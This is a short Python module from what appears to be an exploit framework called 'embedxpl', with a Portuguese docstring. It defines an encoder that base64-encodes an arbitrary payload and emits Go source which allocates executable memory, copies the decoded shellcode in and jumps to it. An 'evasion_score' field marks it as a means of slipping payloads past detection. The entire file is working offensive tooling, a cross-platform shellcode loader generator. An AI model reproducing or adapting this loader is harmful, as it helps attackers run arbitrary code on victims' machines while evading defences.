"""Go base64 encoder — gera código Go com payload embutido em base64."""

import base64
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "go/go_base64"
    description = "Encodes payload as Go source with base64 decode + exec"
    arch        = ["x64", "arm64", "generic"]
    platform    = ["linux", "windows", "macos"]
    evasion_score = 5

    options = {}

    def encode(self, payload: bytes) -> bytes:
        b64 = base64.b64encode(payload).decode()
        go_src = f'''package main
import ("encoding/base64";"os";"syscall";"unsafe")
func main() {{
    sc, _ := base64.StdEncoding.DecodeString("{b64}")
    addr, _, _ := syscall.Syscall(syscall.SYS_MMAP, 0, uintptr(len(sc)),
        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
        syscall.MAP_ANON|syscall.MAP_PRIVATE, 0, 0)
    for i, b := range sc {{ *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }}
    syscall.Syscall(addr, 0, 0, 0)
    os.Exit(0)
}}'''
        return go_src.encode()
